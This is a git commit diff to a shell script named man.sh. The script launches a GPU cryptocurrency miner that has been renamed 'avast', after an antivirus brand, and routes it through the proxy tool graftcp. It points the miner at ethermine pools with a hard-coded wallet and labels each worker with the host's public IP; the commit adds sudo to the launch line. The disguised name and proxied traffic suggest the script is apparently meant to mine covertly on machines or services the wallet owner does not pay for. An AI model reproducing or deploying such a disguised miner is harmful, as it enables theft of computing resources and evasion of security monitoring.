0b7e1ea91a08e07d7bd9c9fa5933566768eb094e
renilo <88342640+renilo@users.noreply.github.com>
2022-04-06 19:41:43 +0700

    Update man.sh

--- man.sh
+++ man.sh
@@ -71,4 +71,4 @@ ph add avast
 
 ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) 
 
-./graftcp/graftcp ./avast -a ethash -w 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p stratum+tcp://us1.ethermine.org:4444 stratum+tcp://us2.ethermine.org:4444 -r $ip-BZ --nvidia 1
+sudo ./graftcp/graftcp ./avast -a ethash -w 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p stratum+tcp://us1.ethermine.org:4444 stratum+tcp://us2.ethermine.org:4444 -r $ip-BZ --nvidia 1
